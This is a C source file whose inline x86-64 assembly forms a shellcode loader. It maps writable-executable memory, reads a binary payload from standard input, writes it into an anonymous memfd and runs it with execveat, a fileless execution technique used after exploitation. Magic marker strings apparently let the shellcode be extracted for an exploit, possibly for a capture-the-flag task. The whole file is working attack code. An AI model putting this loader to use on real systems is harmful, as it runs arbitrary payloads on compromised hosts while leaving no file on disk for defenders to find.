// gcc shellcode_execveat.c -O0 -o sc
#include <unistd.h>

int main() {
    __asm__ __volatile__(

        // magic
        ".ascii \"V1me\";\n"

        ".intel_syntax noprefix\n"
        "nop;\n"
        "nop;\n"
        "nop;\n"
        "nop;\n"
        "nop;\n"
        // x86-64        rdi   rsi   rdx   r10   r8    r9    -
        // bin_buf = mmap(0x23335000, 0x100000, 7, 0x22, -1, 0)

        "mov rdi, 0x23335000;\n"
        "mov rsi, 0x100000;\n"
        "mov rdx, 0x7;\n"
        "mov r10, 0x22;\n"
        "mov r8, -1;\n"
        "mov r9, 0;\n"
        "mov rax, 9;\n"
        "syscall;\n"

        // store bin_buf 
        "push rax;\n"

        //read(0, bin_buf, 16744)

        "mov rdx, 16744;\n"
        "mov rbx, rax;\n"
        "LOOP1:\n"
        "mov rdi, 0;\n"
        "mov rsi, rbx;\n"
        "mov rax, 0;\n"
        "syscall;\n"
        "add rbx, rax;\n"
        "sub rdx, rax;\n"
        "cmp rdx, 0;\n"
        "jg LOOP1;\n"

        // memfd_create("", MFD_CLOEXEC)
        "mov rax, 319;\n"
        "lea rdi, [rip+0x500];\n"
        "mov qword ptr [rdi], 0;\n"
        "mov rsi, 1;\n"
        "mov rax, 319;\n"
        "syscall;\n"

        // store memfd
        "push rax;\n"

        // write(memfd, bin_buf, sizeof(bin_buf)) 
        "pop rdi;\n"
        "pop rsi;\n"
        "push rdi;\n"
        "mov rdx, 16744;\n"
        "mov rax, 1;\n"
        "syscall;\n"

        // execveat(memfd, "", NULL, NULL, AT_EMPTY_PATH)
        "pop rdi;\n"
        "xor rax, rax;\n"
        "push rax;\n"
        "push rsp;\n"
        "pop rsi;\n"
        "mov rdx, rax;\n"
        "mov r10, rax;\n"
        "mov r8, 0x1000;\n"
        "mov rax, 322;\n"
        "syscall;\n"

        "pop rax;\n"

        // just stuck here with read syscall
        "mov rdi, 0;\n"
        "lea rsi, [rip + 0x700];\n"
        "mov rdx, 0x100;\n"
        "mov rax, 0;\n"
        "syscall;\n"

        "xor rax, rax;\n"
        "xor rax, rax;\n"
        "xor rax, rax;\n"
        "xor rax, rax;\n"
        "xor rax, rax;\n"
        "xor rax, rax;\n"
        "xor rax, rax;\n"

        ".att_syntax prefix\n"

        ".byte 0xff,0xff,0xff,0xff\n"
        ".ascii \"V7me\"\n"
        :
        :
        :);
}
